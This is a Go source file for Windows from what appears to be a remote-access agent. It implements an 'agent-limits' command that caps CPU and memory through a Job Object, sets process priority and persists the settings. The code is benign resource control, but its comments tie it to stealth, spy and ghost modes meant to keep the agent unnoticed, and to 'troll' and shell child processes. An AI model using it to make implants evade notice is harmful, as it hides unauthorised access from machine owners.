//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Agent resource limits (stealth = frugality). Enforcement is a private
// Windows Job Object + priority class on the agent process; children
// (troll players, shells) inherit the job by default, which is intended
// and stated in replies. Constants mirror WinBase.h (defined locally so
// no x/sys naming coupling can drift us off the ABI).
const (
	jobObjectExtendedLimitInformation = 9
	jobObjectCPURateControlInfo       = 15

	ctrlEnable  = 0x1
	ctrlHardCap = 0x4

	limitProcessMemory = 0x100

	prioIdle   = 0x40
	prioBelow  = 0x4000
	prioNormal = 0x20

	// memFloorMB refuses caps that would OOM-kill routine work (agent
	// RSS sits ~30-80MB; transfers stream but spike). Below the floor
	// the command errors and nothing is applied.
	memFloorMB = 128
)

// jobRateControl mirrors JOBOBJECT_CPU_RATE_CONTROL_INFORMATION
// (ControlFlags DWORD + CpuRate DWORD, 8 bytes).
type jobRateControl struct {
	ControlFlags uint32
	CpuRate      uint32
}

// memCounters mirrors PROCESS_MEMORY_COUNTERS_EX (psapi).
type memCounters struct {
	CB                         uint32
	PageFaultCount             uint32
	PeakWorkingSetSize         uintptr
	WorkingSetSize             uintptr
	QuotaPeakPagedPoolUsage    uintptr
	QuotaPagedPoolUsage        uintptr
	QuotaPeakNonPagedPoolUsage uintptr
	QuotaNonPagedPoolUsage     uintptr
	PagefileUsage              uintptr
	PeakPagefileUsage          uintptr
	PrivateUsage               uintptr
}

// AgentLimits is the persisted + enforced cap set. Zero CPU/Mem means
// that axis is uncapped; empty Prio leaves priority untouched.
type AgentLimits struct {
	CPU  int
	MemMB int64
	Prio string
}

func limitsPath() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Join(filepath.Dir(exe), "limits.json")
	}
	return filepath.Join(os.TempDir(), "limits.json")
}

// StealthDefaultLimits is the quiet footprint applied automatically in
// stealth-family modes when no explicit limits file exists.
func StealthDefaultLimits() AgentLimits {
	return AgentLimits{CPU: 15, MemMB: 512, Prio: "idle"}
}

// QuietLimits is the barely-noticeable preset behind "limit-agent
// quiet": the legal minimums on every axis (cpu floor 5, mem floor
// 128MB, idle priority). Pure, tested.
func QuietLimits() AgentLimits {
	return AgentLimits{CPU: 5, MemMB: 256, Prio: "idle"}
}

// ExpandLimitPreset rewrites the "quiet" preset to explicit key=value
// args (v1.47.4: "limit-agent quiet"); anything else passes through
// byte-identical. Pure, tested.
func ExpandLimitPreset(args string) string {
	if strings.EqualFold(strings.TrimSpace(args), "quiet") {
		q := QuietLimits()
		return fmt.Sprintf("cpu=%d mem=%d prio=%s", q.CPU, q.MemMB, q.Prio)
	}
	return args
}

// ParseAgentLimits parses "cpu=15 mem=512 prio=idle" (any subset, any
// order). Pure for unit tests.
func ParseAgentLimits(args string) (AgentLimits, error) {
	var l AgentLimits
	var seenPrio bool
	for _, tok := range strings.Fields(args) {
		kv := strings.SplitN(tok, "=", 2)
		if len(kv) != 2 {
			return AgentLimits{}, fmt.Errorf("bad token %q (want key=value, keys: cpu, mem, prio)", tok)
		}
		k, v := strings.ToLower(strings.TrimSpace(kv[0])), strings.TrimSpace(kv[1])
		switch k {
		case "cpu":
			n, err := strconv.Atoi(v)
			if err != nil || n < 0 || n > 100 {
				return AgentLimits{}, fmt.Errorf("cpu must be 0-100 (0 = uncapped)")
			}
			if n > 0 && n < 5 {
				return AgentLimits{}, fmt.Errorf("cpu below 5%% starves the agent (use 0 to uncap)")
			}
			l.CPU = n
		case "mem":
			n, err := strconv.ParseInt(v, 10, 64)
			if err != nil || n < 0 {
				return AgentLimits{}, fmt.Errorf("mem must be MB >= 0 (0 = uncapped)")
			}
			if n > 0 && n < memFloorMB {
				return AgentLimits{}, fmt.Errorf("mem below %dMB would OOM-kill routine work — refused, nothing applied", memFloorMB)
			}
			l.MemMB = n
		case "prio":
			p := strings.ToLower(v)
			if p != "idle" && p != "below" && p != "normal" {
				return AgentLimits{}, fmt.Errorf("prio must be idle|below|normal")
			}
			l.Prio = p
			seenPrio = true
		default:
			return AgentLimits{}, fmt.Errorf("unknown key %q (keys: cpu, mem, prio) or bare 'clear'", k)
		}
	}
	_ = seenPrio
	return l, nil
}

// effectiveLimits resolves file → stealth-defaults → uncapped.
func effectiveLimits() (AgentLimits, string) {
	if b, err := os.ReadFile(limitsPath()); err == nil {
		if l, err := parseLimitsFile(b); err == nil {
			return l, "file"
		}
	}
	if m := AgentMode(); m == ModeStealth || m == ModeSpy || m == ModeGhost {
		return StealthDefaultLimits(), "stealth-default"
	}
	return AgentLimits{}, "none"
}

func parseLimitsFile(b []byte) (AgentLimits, error) {
	var l AgentLimits
	for _, ln := range strings.Split(string(b), "\n") {
		ln = strings.TrimSpace(ln)
		if ln == "" || strings.HasPrefix(ln, "#") {
			continue
		}
		kv := strings.SplitN(ln, "=", 2)
		if len(kv) != 2 {
			continue
		}
		switch strings.ToLower(strings.TrimSpace(kv[0])) {
		case "cpu":
			n, err := strconv.Atoi(strings.TrimSpace(kv[1]))
			if err != nil {
				return l, err
			}
			l.CPU = n
		case "mem":
			n, err := strconv.ParseInt(strings.TrimSpace(kv[1]), 10, 64)
			if err != nil {
				return l, err
			}
			l.MemMB = n
		case "prio":
			l.Prio = strings.ToLower(strings.TrimSpace(kv[1]))
		}
	}
	return l, nil
}

func writeLimitsFile(l AgentLimits) error {
	var sb strings.Builder
	fmt.Fprintf(&sb, "cpu=%d\nmem=%d\nprio=%s\n", l.CPU, l.MemMB, l.Prio)
	p := limitsPath()
	tmp := p + ".tmp"
	if err := os.WriteFile(tmp, []byte(sb.String()), 0644); err != nil {
		return err
	}
	if f, err := os.Open(tmp); err == nil {
		_ = f.Sync()
		f.Close()
	}
	if err := os.Rename(tmp, p); err != nil {
		_ = os.Remove(tmp)
		return err
	}
	return nil
}

var (
	jobMu     sync.Mutex
	jobHandle windows.Handle
)

// ApplyAgentLimits enforces the effective limits on this process.
// Job handle is created once per process and updated in place (a second
// AssignProcessToJobObject on our own membership fails). A foreign
// parent job degrades honestly: priority still applies, job skipped.
func ApplyAgentLimits() error {
	l, _ := effectiveLimits()
	jobMu.Lock()
	defer jobMu.Unlock()
	if l.CPU > 0 {
		if jobHandle == 0 {
			h, err := windows.CreateJobObject(nil, nil)
			if err != nil {
				return fmt.Errorf("job create: %v", err)
			}
			jobHandle = h
		}
		rc := jobRateControl{ControlFlags: ctrlEnable | ctrlHardCap, CpuRate: uint32(l.CPU) * 100}
		ret, err := windows.SetInformationJobObject(jobHandle, jobObjectCPURateControlInfo,
			uintptr(unsafe.Pointer(&rc)), uint32(unsafe.Sizeof(rc)))
		_ = ret
		if err != nil {
			return fmt.Errorf("cpu cap: %v", err)
		}
	}
	if l.MemMB > 0 {
		if jobHandle == 0 {
			h, err := windows.CreateJobObject(nil, nil)
			if err != nil {
				return fmt.Errorf("job create: %v", err)
			}
			jobHandle = h
		}
		var el windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
		el.BasicLimitInformation.LimitFlags = limitProcessMemory
		el.ProcessMemoryLimit = uintptr(l.MemMB) << 20
		ret, err := windows.SetInformationJobObject(jobHandle, jobObjectExtendedLimitInformation,
			uintptr(unsafe.Pointer(&el)), uint32(unsafe.Sizeof(el)))
		_ = ret
		if err != nil {
			return fmt.Errorf("mem cap: %v", err)
		}
	}
	if jobHandle != 0 {
		proc, err := windows.GetCurrentProcess()
		if err == nil {
			if err := windows.AssignProcessToJobObject(jobHandle, proc); err != nil {
				// Already in a foreign job (or similar): priority below
				// still applies; the job caps are skipped, loudly.
				prioErr := applyPriority(l.Prio)
				if prioErr != nil {
					return fmt.Errorf("job assign: %v; prio: %v", err, prioErr)
				}
				return fmt.Errorf("job assign skipped (%v); priority applied, caps need a restart outside the foreign job", err)
			}
		}
	}
	if err := applyPriority(l.Prio); err != nil {
		return err
	}
	return nil
}

func applyPriority(prio string) error {
	var class uint32
	switch prio {
	case "idle":
		class = prioIdle
	case "below":
		class = prioBelow
	case "normal":
		class = prioNormal
	default:
		return nil // unset: leave priority alone
	}
	proc, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	return windows.SetPriorityClass(proc, class)
}

var (
	usageMu     sync.Mutex
	usageInit   bool
	usageUser   int64
	usageKernel int64
	usageWall   time.Time
)

// limitsUsage returns RSS MB and CPU% since the previous call (first
// call reports baseline-taken). Read-only syscalls, safe anywhere.
func limitsUsage() (rssMB int64, cpuPct float64, baseline bool, err error) {
	proc, err := windows.GetCurrentProcess()
	if err != nil {
		return 0, 0, false, err
	}
	var mc memCounters
	mc.CB = uint32(unsafe.Sizeof(mc))
	mod := windows.NewLazySystemDLL("psapi.dll")
	prc := mod.NewProc("GetProcessMemoryInfo")
	r1, _, e1 := prc.Call(uintptr(proc), uintptr(unsafe.Pointer(&mc)), uintptr(mc.CB))
	if r1 == 0 {
		return 0, 0, false, e1
	}
	rssMB = int64(mc.WorkingSetSize) >> 20
	var ct, et, kt, ut windows.Filetime
	if err := windows.GetProcessTimes(proc, &ct, &et, &kt, &ut); err != nil {
		return rssMB, 0, false, err
	}
	now := time.Now()
	u, k := kt.Nanoseconds(), ut.Nanoseconds()
	usageMu.Lock()
	defer usageMu.Unlock()
	if !usageInit {
		usageInit, usageUser, usageKernel, usageWall = true, u, k, now
		return rssMB, 0, true, nil
	}
	du, dk, dw := u-usageUser, k-usageKernel, now.Sub(usageWall)
	usageUser, usageKernel, usageWall = u, k, now
	if dw <= 0 {
		return rssMB, 0, false, nil
	}
	cpus := float64(runtime.NumCPU())
	if cpus < 1 {
		cpus = 1
	}
	return rssMB, float64(du+dk) / float64(dw.Nanoseconds()) / cpus * 100, false, nil
}

// AgentLimitsCmd implements "agent-limits [...]".
func AgentLimitsCmd(args string) (string, error) {
	args = strings.TrimSpace(args)
	if args == "" {
		return limitsReport()
	}
	if strings.EqualFold(args, "clear") {
		_ = os.Remove(limitsPath())
		if err := ApplyAgentLimits(); err != nil {
			// Report still shows the (now mode-driven) state.
			if rep, rerr := limitsReport(); rerr == nil {
				return rep + fmt.Sprintf(" [clear note: %v]", err), nil
			}
			return "", err
		}
		return "explicit caps cleared\n" + mustReport(), nil
	}
	part, err := ParseAgentLimits(args)
	if err != nil {
		return "", err
	}
	// Merge over the stored file (absent file = zeros, so partial sets
	// never zero-out their siblings).
	cur, _ := effectiveLimits()
	// effectiveLimits may inject stealth defaults; only merge over the
	// FILE so a partial set in stealth mode doesn't bake defaults in.
	if b, rerr := os.ReadFile(limitsPath()); rerr == nil {
		if f, ferr := parseLimitsFile(b); ferr == nil {
			cur = f
		}
	}
	for _, tok := range strings.Fields(args) {
		k := strings.ToLower(strings.SplitN(tok+"=", "=", 2)[0])
		switch k {
		case "cpu":
			cur.CPU = part.CPU
		case "mem":
			cur.MemMB = part.MemMB
		case "prio":
			cur.Prio = part.Prio
		}
	}
	if err := writeLimitsFile(cur); err != nil {
		return "", err
	}
	if err := ApplyAgentLimits(); err != nil {
		if rep, rerr := limitsReport(); rerr == nil {
			return rep + fmt.Sprintf(" [apply note: %v]", err), nil
		}
		return "", err
	}
	return mustReport(), nil
}

func mustReport() string {
	if rep, err := limitsReport(); err == nil {
		return rep
	}
	return "limits stored"
}

func limitsReport() (string, error) {
	l, src := effectiveLimits()
	var sb strings.Builder
	fmt.Fprintf(&sb, "limits: cpu<=")
	if l.CPU > 0 {
		fmt.Fprintf(&sb, "%d%%", l.CPU)
	} else {
		sb.WriteString("off")
	}
	fmt.Fprintf(&sb, " mem<=")
	if l.MemMB > 0 {
		fmt.Fprintf(&sb, "%dMB", l.MemMB)
	} else {
		sb.WriteString("off")
	}
	fmt.Fprintf(&sb, " prio=%s (source: %s)", orDefault(l.Prio, "normal"), src)
	rss, pct, baseline, err := limitsUsage()
	if err != nil {
		fmt.Fprintf(&sb, " | live: n/a (%v)", err)
		return sb.String(), nil
	}
	if baseline {
		fmt.Fprintf(&sb, " | live: rss=%dMB cpu=(baseline taken, query again)", rss)
	} else {
		fmt.Fprintf(&sb, " | live: rss=%dMB cpu=%.1f%%", rss, pct)
	}
	if l.MemMB > 0 {
		sb.WriteString(" [warn: OS kills past mem cap]")
	}
	return sb.String(), nil
}

func orDefault(s, d string) string {
	if s == "" {
		return d
	}
	return s
}
